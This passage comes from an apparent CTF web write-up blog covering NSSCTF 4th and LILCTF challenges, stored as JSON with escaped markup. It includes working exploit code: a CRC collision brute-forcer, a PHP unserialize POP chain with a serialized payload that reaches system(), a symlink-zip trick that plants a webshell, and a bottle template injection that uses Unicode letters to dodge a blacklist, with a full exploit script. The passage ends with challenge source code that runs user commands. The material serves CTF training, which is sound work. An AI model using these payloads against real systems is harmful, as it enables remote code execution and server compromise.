(isset($_POST[\u0026#39;pass\u0026#39;]) \u0026amp;\u0026amp; strlen($SECRET_PASS) == strlen($_POST[\u0026#39;pass\u0026#39;])) { $correct_pass_crc16 = compute_crc16($SECRET_PASS); $correct_pass_crc8 = calculate_crc8($SECRET_PASS); $user_input = $_POST[\u0026#39;pass\u0026#39;]; $user_pass_crc16 = compute_crc16($user_input); $user_pass_crc8 = calculate_crc8($user_input); if ($SECRET_PASS === $user_input) { die(\u0026#34;这样不行\u0026#34;); } if ($correct_pass_crc16 !== $user_pass_crc16) { die(\u0026#34;这样也不行\u0026#34;); } if ($correct_pass_crc8 !== $user_pass_crc8) { die(\u0026#34;这样还是不行吧\u0026#34;); } $granted_access = true; if ($granted_access) { echo \u0026#34;都到这份上了,flag就给你了: $FLAG\u0026#34;; } else { echo \u0026#34;不不不\u0026#34;; } } else { echo \u0026#34;再试试\u0026#34;; } ?\u0026gt; 实现了CRC16和CRC8的验证，要求长度和所给$SECRET_PASS一样\n直接爆破，一开始写的python脚本，发现python的len和php的strlen对某些字符的长度判断不同，后来改用php写，只是爆破速度慢一些：\n\u0026lt;?php function compute_crc16($data) { $checksum = 0xFFFF; for ($i = 0; $i \u0026lt; strlen($data); $i++) { $checksum ^= ord($data[$i]); for ($j = 0; $j \u0026lt; 8; $j++) { if ($checksum \u0026amp; 1) { $checksum = (($checksum \u0026gt;\u0026gt; 1) ^ 0xA001); } else { $checksum \u0026gt;\u0026gt;= 1; } } } return $checksum; } function calculate_crc8($input) { static $crc8_table = [ 0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15, 0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D, 0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65, 0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D, 0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5, 0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD, 0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85, 0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD, 0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2, 0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA, 0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2, 0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A, 0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32, 0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A, 0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42, 0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A, 0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C, 0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4, 0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC, 0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4, 0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C, 0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44, 0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C, 0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34, 0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B, 0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63, 0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B, 0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13, 0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB, 0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83, 0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB, 0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3 ]; $bytes = unpack(\u0026#39;C*\u0026#39;, $input); $length = count($bytes); $crc = 0; for ($k = 1; $k \u0026lt;= $length; $k++) { $crc = $crc8_table[($crc ^ $bytes[$k]) \u0026amp; 0xff]; } return $crc \u0026amp; 0xff; } $SECRET_PASS = \u0026#34;Enj0yNSSCTF4th!\u0026#34;; $target_crc16 = compute_crc16($SECRET_PASS); $target_crc8 = calculate_crc8($SECRET_PASS); echo \u0026#34;目标CRC16: $target_crc16\\n\u0026#34;; echo \u0026#34;目标CRC8: $target_crc8\\n\u0026#34;; echo \u0026#34;开始爆破...\\n\u0026#34;; $found = false; $attempts = 0; while (!$found) { $attempts++; // 生成随机15字节字符串 $random_bytes = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; 15; $i++) { $random_bytes .= chr(random_int(0, 255)); } // 跳过原始密码 if ($random_bytes === $SECRET_PASS) { continue; } $crc16 = compute_crc16($random_bytes); $crc8 = calculate_crc8($random_bytes); if ($crc16 === $target_crc16 \u0026amp;\u0026amp; $crc8 === $target_crc8) { $found = true; echo \u0026#34;尝试次数: $attempts\\n\u0026#34;; echo \u0026#34;碰撞字符串: \u0026#34; . bin2hex($random_bytes) . \u0026#34;\\n\u0026#34;; echo \u0026#34;CRC16: $crc16, CRC8: $crc8\\n\u0026#34;; echo \u0026#34;pass=\u0026#34; . urlencode($random_bytes) . \u0026#34;\\n\u0026#34;; } // 显示进度 if ($attempts % 10000 === 0) { echo \u0026#34;已尝试 $attempts 次...\\n\u0026#34;; } } [mpga]filesystem 题目给了www.zip备份文件，反序列化漏洞点位于：\nif ($action === \u0026#39;home\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;submit_md5\u0026#39;])) { $filename_param = isset($_POST[\u0026#39;file_to_check\u0026#39;]) ? $_POST[\u0026#39;file_to_check\u0026#39;] : \u0026#39;\u0026#39;; if (!empty($filename_param)) { $file_object = @unserialize($filename_param); if ($file_object === false || !($file_object instanceof FileManager)) { $file_object = new FileManager($filename_param); } $output = $file_object-\u0026gt;getFileHash(); } else { $output = \u0026#34;\u0026lt;p class=\u0026#39;text-gray-600\u0026#39;\u0026gt;请输入文件路径进行MD5校验。\u0026lt;/p\u0026gt;\u0026#34;; } } submit_md5随便传一个值就能触发unserialize，构造的序列化字符串放在file_to_check传入即可，接下来就是构造链子，先看一下有哪些class：\n\u0026lt;?php class ApplicationContext{ public $contextName; public function __construct(){ $this-\u0026gt;contextName = \u0026#39;ApplicationContext\u0026#39;; } public function __destruct(){ $this-\u0026gt;contextName = strtolower($this-\u0026gt;contextName); } } class ContentProcessor{ private $processedContent; public $callbackFunction; public function __construct(){ $this-\u0026gt;processedContent = new FunctionInvoker(); } public function __get($key){ if (property_exists($this, $key)) { if (is_object($this-\u0026gt;$key) \u0026amp;\u0026amp; is_string($this-\u0026gt;callbackFunction)) { $this-\u0026gt;$key-\u0026gt;{$this-\u0026gt;callbackFunction}($_POST[\u0026#39;cmd\u0026#39;]); } } } } class FileManager{ public $targetFile; public $responseData = \u0026#39;default_response\u0026#39;; public function __construct($targetFile = null){ $this-\u0026gt;targetFile = $targetFile; } public function filterPath(){ if(preg_match(\u0026#39;/^\\/|php:|data|zip|\\.\\.\\//i\u0026#39;,$this-\u0026gt;targetFile)){ die(\u0026#39;文件路径不符合规范\u0026#39;); } } public function performWriteOperation($var){ $targetObject = $this-\u0026gt;targetFile; $value = $targetObject-\u0026gt;$var; } public function getFileHash(){ $this-\u0026gt;filterPath(); if (is_string($this-\u0026gt;targetFile)) { if (file_exists($this-\u0026gt;targetFile)) { $md5_hash = md5_file($this-\u0026gt;targetFile); return \u0026#34;文件MD5哈希: \u0026#34; . htmlspecialchars($md5_hash); } else { die(\u0026#34;文件未找到\u0026#34;); } } else if (is_object($this-\u0026gt;targetFile)) { try { $md5_hash = md5_file($this-\u0026gt;targetFile); return \u0026#34;文件MD5哈希 (尝试): \u0026#34; . htmlspecialchars($md5_hash); } catch (TypeError $e) { return \u0026#34;无法计算MD5哈希，因为文件参数无效: \u0026#34; . htmlspecialchars($e-\u0026gt;getMessage()); } } else { die(\u0026#34;文件未找到\u0026#34;); } } public function __toString(){ if (isset($_POST[\u0026#39;method\u0026#39;]) \u0026amp;\u0026amp; method_exists($this, $_POST[\u0026#39;method\u0026#39;])) { $method = $_POST[\u0026#39;method\u0026#39;]; $var = isset($_POST[\u0026#39;var\u0026#39;]) ? $_POST[\u0026#39;var\u0026#39;] : null; $this-\u0026gt;$method($var); } return $this-\u0026gt;responseData; } } class FunctionInvoker{ public $functionName; public $functionArguments; public function __call($name, $arg){ if (function_exists($name)) { $name($arg[0]); } } } 只有ApplicationContext类中有__destruct方法，这条链从入口开始找比较方便，__destruct方法中调用了strtolower函数，将contextName成员置为FileManager类的实例就能继续执行__toString方法，将method置为performWriteOperation，就能进入performWriteOperation方法，只需要再将targetObject置为ContentProcessor类的实例再将var置为processedContent，尝试访问private成员就会调用ContentProcessor类的__get方法，最后就是命令执行的部分，将callbackFunction置为system，尝试访问FunctionInvoker类中不存在的方法就会调用__call方法，只需再传入cmd为要执行的命令就能实现RCE，完整的链子：\nApplicationContext.__destruct -\u0026gt; FileManager.__toString -\u0026gt; FileManager.performWriteOperation -\u0026gt; ContentProcessor.__get -\u0026gt; FunctionInvoker.__call exp：\n\u0026lt;?php class ApplicationContext{ public $contextName; } class ContentProcessor{ private $processedContent; public $callbackFunction; public function __construct(){ $this-\u0026gt;processedContent = new FunctionInvoker(); } } class FileManager{ public $targetFile; public $responseData = \u0026#39;default_response\u0026#39;; } class FunctionInvoker{ } $a = new ApplicationContext(); $b = new FileManager(); $a-\u0026gt;contextName = $b; // 触发__toString method=performWriteOperation\u0026amp;var=processedContent $c = new ContentProcessor(); $c-\u0026gt;callbackFunction = \u0026#34;system\u0026#34;; $b-\u0026gt;targetFile = $c; // 触发__get cmd=whoami print(urlencode(serialize($a))); ?\u0026gt; 生成的序列化字符串：\nO%3A18%3A%22ApplicationContext%22%3A1%3A%7Bs%3A11%3A%22contextName%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D%7D ez_upload 比赛过程中给了一条hint：ez_upload: php -S\nPHP\u0026lt;=7.4.21存在远程源码泄露漏洞：\nindex.php：\n\u0026lt;?php error_reporting(0); $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]) === \u0026#39;application/zip\u0026#39;){ exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; unzip -o \u0026#39; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); }; ?\u0026gt; 拿到源码的时候比赛已经快结束了，赛后仔细分析一遍，先看finfo_open函数和参数FILEINFO_MIME_TYPE：\nfunction finfo_open(int $flags = 0, ?string $magic_database = null): finfo|false { } @param int $flags — One or disjunction of more Fileinfo constants. @param string|null $magic_database FILEINFO_MIME_TYPE (int) Return the mime type. finfo_open函数打开一个魔数数据库并且返回它的资源句柄，指向底层系统资源的引用，本地环境var_dump看一下具体是什么内容：\nresource(2) of type (file_info) 再看一下全局数据$FILE：\n$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;] - 上传文件的名称\r$_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] - 上传文件的类型\r$_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] - 上传文件的大小，以字节计\r$_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;] - 存储在服务器的文件的临时副本的名称 // 临时目录位置由php.ini决定 echo ini_get(\u0026#39;upload_tmp_dir\u0026#39;);\r$_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] - 由文件上传导致的错误代码 简单来说finfo_file($finfo, $_FILES[\u0026quot;file\u0026quot;][\u0026quot;tmp_name\u0026quot;]) === 'application/zip'用于判断文件类型是否为zip类型，严格限制了只能上传zip类型的文件\nphp有个临时文件的机制，对于上传的文件都会临时在upload_tmp_dir目录下保存一个副本phpXXXXXX.tmp (在windows下有tmp后缀，linux没有)，在php程序正常结束时被删除，但是如果php程序崩溃或非正常结束，那么临时文件就会被保存下来\n本题利用的是linux的软链接特性，类似windows上的快捷方式，创建软链接会有一个类似文件夹的文件产生，里面连通被指向的目录，需要题目环境执行解压操作才能实现任意路径写入webshell\nln -s创建软链接文件link，指向/var/www/html：\nln -s /var/www/html link 将link软链接打包成zip压缩包：\nzip --symlinks link1.zip link 在link中放入木马文件shell.php，将link以及shell.php一并打包为zip压缩包：\nzip -r link2.zip link 再依次上传两个zip压缩包，先上传link1.zip，在/tmp目录下创建一个指向/var/www/html的软链接，再上传link2.zip，其中的shell.php会被直接解压到软链接指向的/var/www/html目录下，实现任意路径webshell的写入，最后蚁剑连接就能拿到shell，flag在根目录下：NSSCTF{y0u_ar3_50ft_l1nk_m4st3r!!!!}\n参考资料：\nhttps://cn-sec.com/archives/1634720.html\nhttps://www.cnblogs.com/linuxsec/articles/11278477.html\nhttps://0ran9e.fun/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/\n","permalink":"https://blog.w8nn9z.top/posts/ctf/nssctf-4th-web-writeup/","summary":"","title":"NSSCTF 4th WEB Writeup"},{"content":"ez_bottle 附件给了源码，web-ez-bottle.py：\nfrom bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), \u0026#39;uploads\u0026#39;) os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), \u0026#39;static\u0026#39;) MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = [\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;os\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;sock\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;bul\u0026#34;, \u0026#34;class\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;globals\u0026#34;, \u0026#34;get\u0026#34;, \u0026#34;open\u0026#34;] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr \u0026gt;\u0026gt; 16) \u0026amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(\u0026#39;/\u0026#39;) def index(): return static_file(\u0026#39;index.html\u0026#39;, root=STATIC_DIR) @route(\u0026#39;/static/\u0026lt;filename\u0026gt;\u0026#39;) def server_static(filename): return static_file(filename, root=STATIC_DIR) @route(\u0026#39;/upload\u0026#39;) def upload_page(): return static_file(\u0026#39;upload.html\u0026#39;, root=STATIC_DIR) @post(\u0026#39;/upload\u0026#39;) def upload(): zip_file = request.files.get(\u0026#39;file\u0026#39;) if not zip_file or not zip_file.filename.endswith(\u0026#39;.zip\u0026#39;): return \u0026#39;Invalid file. Please upload a ZIP file.\u0026#39; if len(zip_file.file.read()) \u0026gt; MAX_FILE_SIZE: return \u0026#39;File size exceeds 1MB. Please upload a smaller ZIP file.\u0026#39; zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, \u0026#39;upload.zip\u0026#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, \u0026#39;r\u0026#39;) as z: for file_info in z.infolist(): if is_symlink(file_info): return \u0026#39;Symbolic links are not allowed.\u0026#39; real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return \u0026#39;Path traversal detected.\u0026#39; z.extractall(extract_dir) except zipfile.BadZipFile: return \u0026#39;Invalid ZIP file.\u0026#39; files = os.listdir(extract_dir) files.remove(\u0026#39;upload.zip\u0026#39;) return template(\u0026#34;文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}\u0026#34;, files=\u0026#34;, \u0026#34;.join(files), md5=md5_hash, first_file=files[0] if files else \u0026#34;nofile\u0026#34;) @route(\u0026#39;/view/\u0026lt;md5\u0026gt;/\u0026lt;filename\u0026gt;\u0026#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return \u0026#34;File not found.\u0026#34; with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() if contains_blacklist(content): return \u0026#34;you are hacker!!!nonono!!!\u0026#34; try: return template(content) except Exception as e: return f\u0026#34;Error rendering template: {str(e)}\u0026#34; @error(404) def error404(error): return \u0026#34;bbbbbboooottle\u0026#34; @error(403) def error403(error): return \u0026#34;Forbidden: You don\u0026#39;t have permission to access this resource.\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000, debug=False) python的bottle框架，实现了上传zip压缩包并解压到指定目录的功能，同时有对内容的过滤，可以发现过滤了常用的注入模板{{}} \u0026lt;%%\u0026gt;以及常见的os等关键字，bottle框架还可以使用单个百分号来执行python命令，但是不会将内容渲染到网页。结合/static路由可以读取static目录下静态文件的特性，考虑将/flag文件复制到static目录中，期望执行的命令：\ncp /flag ./static/flag.txt 一开始考虑通过斜体字符来绕过o和a，多次尝试之后才发现打开文件的编码方式是utf-8，斜体字符会被解析成生僻汉字，考虑往Unicode非ASCII字符方向走，编写恶意文件内容要注意开头需要有个回车符，否则%后的内容不会被当作python命令执行：\n% from bottle import request\r% import 𝐨s\r% 𝐨s.system(request.query.v1) 完整exp:\nfrom urllib.parse import unquote import requests import zipfile url = \u0026#34;http://challenge.xinshi.fun:46226/upload\u0026#34; file_path = \u0026#34;./file.zip\u0026#34; payload = unquote(\u0026#34;%0A\u0026#34;) payload += \u0026#34;% \u0026#34; + \u0026#34;from bottle import request\\n\u0026#34; payload += \u0026#34;% \u0026#34; + \u0026#34;import 𝐨s\\n\u0026#34; payload += \u0026#34;% \u0026#34; + \u0026#34;𝐨s.system(request.query.v1)\u0026#34; with open(\u0026#34;file.txt\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(payload.encode(\u0026#39;utf-8\u0026#39;)) with zipfile.ZipFile(\u0026#34;file.zip\u0026#34;, \u0026#39;w\u0026#39;, zipfile.ZIP_DEFLATED) as zip: zip.write(\u0026#34;file.txt\u0026#34;) with open(file_path, \u0026#39;rb\u0026#39;) as f: files = {\u0026#39;file\u0026#39;: (file_path, f, \u0026#39;application/zip\u0026#39;)} response = requests.post(url, files=files) print(response.text) # 输出服务器返回的结果 再去访问该文件，带上v1传参要执行的命令：\nhttp://challenge.xinshi.fun:46226/view/33fb755cb11889d8398700b6238f5375/file.txt?v1=cp%20/flag%20./static/flag.txt 做完之后发现本题没有过滤flag字符，根本用不着导入bottle中的request，request.query.v1类似flask中的request.args.v1：\n% import 𝐨s\r% 𝐨s.system(\u0026#39;cp /flag ./static/flag.txt\u0026#39;) 最后访问static目录中的flag.txt即可拿到flag：LILCTF{6oT7IE_has_6eeN_recyc13d}\n参考资料：\nhttps://xz.aliyun.com/news/17718\nhttps://www.osgeo.cn/bottle/api.html#the-request-object\nEkko_note 题目给了源码，web-ekko_exec.py：\n# -*- encoding: utf-8 -*- \u0026#39;\u0026#39;\u0026#39; @File : app.py @Time : 2066/07/05 19:20:29 @Author : Ekko exec inc. 某牛马程序员 \u0026#39;\u0026#39;\u0026#39; import os import time import uuid import requests from functools import wraps from datetime import datetime from secrets import token_urlsafe from flask_sqlalchemy import SQLAlchemy from werkzeug.security import generate_password_hash, check_password_hash from flask import Flask, render_template, redirect, url_for, request, flash, session SERVER_START_TIME = time.time() # 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。 # 反正整个程序没有一个地方用到random库。应该没有什么问题。 import random random.seed(SERVER_START_TIME) admin_super_strong_password = token_urlsafe() app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;your-secret-key-here\u0026#39; app.config[\u0026#39;SQLALCHEMY_DATABASE_URI\u0026#39;] = \u0026#39;sqlite:///site.db\u0026#39; app.config[\u0026#39;SQLALCHEMY_TRACK_MODIFICATIONS\u0026#39;] = False db = SQLAlchemy(app) class User(db.Model): id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(20), unique=True, nullable=False) email = db.Column(db.String(120), unique=True, nullable=False) password = db.Column(db.String(60), nullable=False) is_admin = db.Column(db.Boolean, default=False) time_api = db.Column(db.String(200), default=\u0026#39;https://api.uuni.cn//api/time\u0026#39;) class PasswordResetToken(db.Model): id = db.Column(db.Integer, primary_key=True) user_id = db.Column(db.Integer, db.ForeignKey(\u0026#39;user.id\u0026#39;), nullable=False) token = db.Column(db.String(36), unique=True, nullable=False) used = db.Column(db.Boolean, default=False) def padding(input_string): byte_string = input_string.encode(\u0026#39;utf-8\u0026#39;) if len(byte_string) \u0026gt; 6: byte_string = byte_string[:6] padded_byte_string = byte_string.ljust(6, b\u0026#39;\\x00\u0026#39;) padded_int = int.from_bytes(padded_byte_string, byteorder=\u0026#39;big\u0026#39;) return padded_int with app.app_context(): db.create_all() if not User.query.filter_by(username=\u0026#39;admin\u0026#39;).first(): admin = User( username=\u0026#39;admin\u0026#39;, email=\u0026#39;admin@example.com\u0026#39;, password=generate_password_hash(admin_super_strong_password), is_admin=True ) db.session.add(admin) db.session.commit() def login_required(f): @wraps(f) def decorated_function(*args, **kwargs): if \u0026#39;user_id\u0026#39; not in session: flash(\u0026#39;请登录\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) return f(*args, **kwargs) return decorated_function def admin_required(f): @wraps(f) def decorated_function(*args, **kwargs): if \u0026#39;user_id\u0026#39; not in session: flash(\u0026#39;请登录\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) user = User.query.get(session[\u0026#39;user_id\u0026#39;]) if not user.is_admin: flash(\u0026#39;你不是admin\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;home\u0026#39;)) return f(*args, **kwargs) return decorated_function def check_time_api(): user = User.query.get(session[\u0026#39;user_id\u0026#39;]) try: response = requests.get(user.time_api) data = response.json() datetime_str = data.get(\u0026#39;date\u0026#39;) if datetime_str: print(datetime_str) current_time = datetime.fromisoformat(datetime_str) return current_time.year \u0026gt;= 2066 except Exception as e: return None return None @app.route(\u0026#39;/\u0026#39;) def home(): return render_template(\u0026#39;home.html\u0026#39;) @app.route(\u0026#39;/server_info\u0026#39;) @login_required def server_info(): return { \u0026#39;server_start_time\u0026#39;: SERVER_START_TIME, \u0026#39;current_time\u0026#39;: time.time() } @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form.get(\u0026#39;username\u0026#39;) email = request.form.get(\u0026#39;email\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) confirm_password = request.form.get(\u0026#39;confirm_password\u0026#39;) if password != confirm_password: flash(\u0026#39;密码错误\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;register\u0026#39;)) existing_user = User.query.filter_by(username=username).first() if existing_user: flash(\u0026#39;已经存在这个用户了\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;register\u0026#39;)) existing_email = User.query.filter_by(email=email).first() if existing_email: flash(\u0026#39;这个邮箱已经被注册了\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;register\u0026#39;)) hashed_password = generate_password_hash(password) new_user = User(username=username, email=email, password=hashed_password) db.session.add(new_user) db.session.commit() flash(\u0026#39;注册成功，请登录\u0026#39;, \u0026#39;success\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form.get(\u0026#39;username\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) user = User.query.filter_by(username=username).first() if user and check_password_hash(user.password, password): session[\u0026#39;user_id\u0026#39;] = user.id session[\u0026#39;username\u0026#39;] = user.username session[\u0026#39;is_admin\u0026#39;] = user.is_admin flash(\u0026#39;登陆成功，欢迎!\u0026#39;, \u0026#39;success\u0026#39;) return redirect(url_for(\u0026#39;dashboard\u0026#39;)) else: flash(\u0026#39;用户名或密码错误!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/logout\u0026#39;) @login_required def logout(): session.clear() flash(\u0026#39;成功登出\u0026#39;, \u0026#39;info\u0026#39;) return redirect(url_for(\u0026#39;home\u0026#39;)) @app.route(\u0026#39;/dashboard\u0026#39;) @login_required def dashboard(): return render_template(\u0026#39;dashboard.html\u0026#39;) @app.route(\u0026#39;/forgot_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def forgot_password(): if request.method == \u0026#39;POST\u0026#39;: email = request.form.get(\u0026#39;email\u0026#39;) user = User.query.filter_by(email=email).first() if user: # 选哪个UUID版本好呢，好头疼 \u0026gt;_\u0026lt; # UUID v8吧，看起来版本比较新 token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧 reset_token = PasswordResetToken(user_id=user.id, token=token) db.session.add(reset_token) db.session.commit() # TODO：写一个SMTP服务把token发出去 flash(f\u0026#39;密码恢复token已经发送，请检查你的邮箱\u0026#39;, \u0026#39;info\u0026#39;) return redirect(url_for(\u0026#39;reset_password\u0026#39;)) else: flash(\u0026#39;没有找到该邮箱对应的注册账户\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;forgot_password\u0026#39;)) return render_template(\u0026#39;forgot_password.html\u0026#39;) @app.route(\u0026#39;/reset_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def reset_password(): if request.method == \u0026#39;POST\u0026#39;: token = request.form.get(\u0026#39;token\u0026#39;) new_password = request.form.get(\u0026#39;new_password\u0026#39;) confirm_password = request.form.get(\u0026#39;confirm_password\u0026#39;) if new_password != confirm_password: flash(\u0026#39;密码不匹配\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;reset_password\u0026#39;)) reset_token = PasswordResetToken.query.filter_by(token=token, used=False).first() if reset_token: user = User.query.get(reset_token.user_id) user.password = generate_password_hash(new_password) reset_token.used = True db.session.commit() flash(\u0026#39;成功重置密码！请重新登录\u0026#39;, \u0026#39;success\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) else: flash(\u0026#39;无效或过期的token\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;reset_password\u0026#39;)) return render_template(\u0026#39;reset_password.html\u0026#39;) @app.route(\u0026#39;/execute_command\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) @login_required def execute_command(): result = check_time_api() if result is None: flash(\u0026#34;API死了啦，都你害的啦。\u0026#34;, \u0026#34;danger\u0026#34;) return redirect(url_for(\u0026#39;dashboard\u0026#39;)) if not result: flash(\u0026#39;2066年才完工哈，你可以穿越到2066年看看\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;dashboard\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: command = request.form.get(\u0026#39;command\u0026#39;) os.system(command) # 什么？你说安全？不是，都说了还没完工催什么。 return redirect(url_for(\u0026#39;execute_command\u0026#39;)) return render_template(\u0026#39;execute_command.html\u0026#39;) @app.route(\u0026#39;/admin/settings\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) @admin_required def admin_settings(): user = User.query.get(session[\u0026#39;user_id\u0026#39;]) if request.method == \u0026#39;POST\u0026#39;: new_api = request.form.get(\u0026#39;time_api\u0026#39;) user.time_api = new_api db.session.commit() flash(\u0026#39;成功更新API！\u0026#39;, \u0026#39;success\u0026#39;) return redirect(url_for(\u0026#39;admin_settings\u0026#39;)) return render_template(\u0026#39;admin_settings.html\u0026#39;, time_api=user.time_api) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=False, host=\u0026#34;0.0.0.0\u0026#34;) 